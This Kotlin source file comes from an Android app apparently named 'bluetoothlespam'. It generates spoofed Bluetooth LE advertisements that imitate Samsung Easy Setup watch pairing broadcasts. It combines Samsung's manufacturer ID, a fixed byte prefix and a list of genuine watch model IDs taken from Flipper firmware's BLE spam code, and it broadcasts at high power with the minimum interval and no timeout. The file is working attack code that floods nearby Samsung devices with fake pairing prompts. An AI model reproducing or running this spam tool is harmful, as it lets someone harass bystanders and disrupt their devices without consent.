package de.simon.dankelmann.bluetoothlespam.AdvertisementSetGenerators

import android.bluetooth.le.AdvertisingSetParameters
import android.util.Log
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingCallback
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingSetCallback
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertiseMode
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetRange
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetType
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementTarget
import de.simon.dankelmann.bluetoothlespam.Enums.PrimaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.SecondaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.TxPowerLevel
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers.Companion.toHexString
import de.simon.dankelmann.bluetoothlespam.Models.AdvertisementSet
import de.simon.dankelmann.bluetoothlespam.Models.ManufacturerSpecificData

class EasySetupWatchAdvertisementSetGenerator:IAdvertisementSetGenerator{

    // Device Id's taken from here:
    // https://github.com/Flipper-XFW/Xtreme-Firmware/blob/dev/applications/external/ble_spam/protocols/easysetup.c

    private val _manufacturerId = 117 // 0x75 == 117 = Samsung

    private val preprendedBytesWatch = StringHelpers.decodeHex("010002000101FF000043")

    val _genuineWatchIds = mapOf(
        "1A" to "Fallback Watch",
        "01" to "White Watch4 Classic 44m",
        "02" to "Black Watch4 Classic 40m",
        "03" to "White Watch4 Classic 40m",
        "04" to "Black Watch4 44mm",
        "05" to "Silver Watch4 44mm",
        "06" to "Green Watch4 44mm",
        "07" to "Black Watch4 40mm",
        "08" to "White Watch4 40mm",
        "09" to "Gold Watch4 40mm",
        "0A" to "French Watch4",
        "0B" to "French Watch4 Classic",
        "0C" to "Fox Watch5 44mm",
        "11" to "Black Watch5 44mm",
        "12" to "Sapphire Watch5 44mm",
        "13" to "Purpleish Watch5 40mm",
        "14" to "Gold Watch5 40mm",
        "15" to "Black Watch5 Pro 45mm",
        "16" to "Gray Watch5 Pro 45mm",
        "17" to "White Watch5 44mm",
        "18" to "White & Black Watch5",
        "1B" to "Black Watch6 Pink 40mm",
        "1C" to "Gold Watch6 Gold 40mm",
        "1D" to "Silver Watch6 Cyan 44mm",
        "1E" to "Black Watch6 Classic 43m",
        "20" to "Green Watch6 Classic 43m",
    )

    override fun getAdvertisementSets(inputData: Map<String, String>?): List<AdvertisementSet> {
        var advertisementSets:MutableList<AdvertisementSet> = mutableListOf()

        val data = inputData ?: _genuineWatchIds

        // WATCHES
        data.map {
            var advertisementSet:AdvertisementSet = AdvertisementSet()
            advertisementSet.target = AdvertisementTarget.ADVERTISEMENT_TARGET_SAMSUNG
            advertisementSet.type = AdvertisementSetType.ADVERTISEMENT_TYPE_EASY_SETUP_WATCH
            advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_CLOSE

            // Advertise Settings
            advertisementSet.advertiseSettings.advertiseMode = AdvertiseMode.ADVERTISEMODE_LOW_LATENCY
            advertisementSet.advertiseSettings.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertiseSettings.connectable = false
            advertisementSet.advertiseSettings.timeout = 0

            // Advertising Parameters
            advertisementSet.advertisingSetParameters.legacyMode = true
            advertisementSet.advertisingSetParameters.interval = AdvertisingSetParameters.INTERVAL_MIN
            advertisementSet.advertisingSetParameters.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertisingSetParameters.primaryPhy = PrimaryPhy.PHY_LE_1M
            advertisementSet.advertisingSetParameters.secondaryPhy = SecondaryPhy.PHY_LE_1M

            // AdvertiseData
            advertisementSet.advertiseData.includeDeviceName = false

            val manufacturerSpecificData = ManufacturerSpecificData()
            manufacturerSpecificData.manufacturerId = _manufacturerId
            manufacturerSpecificData.manufacturerSpecificData = preprendedBytesWatch.plus(StringHelpers.decodeHex(it.key))

            advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)
            advertisementSet.advertiseData.includeTxPower = false

            // Scan Response
            //advertisementSet.scanResponse.includeTxPower = true

            // General Data
            advertisementSet.title = it.value

            // Callbacks
            advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
            advertisementSet.advertisingCallback = GenericAdvertisingCallback()

            advertisementSets.add(advertisementSet)
        }

        return advertisementSets.toList()
    }
}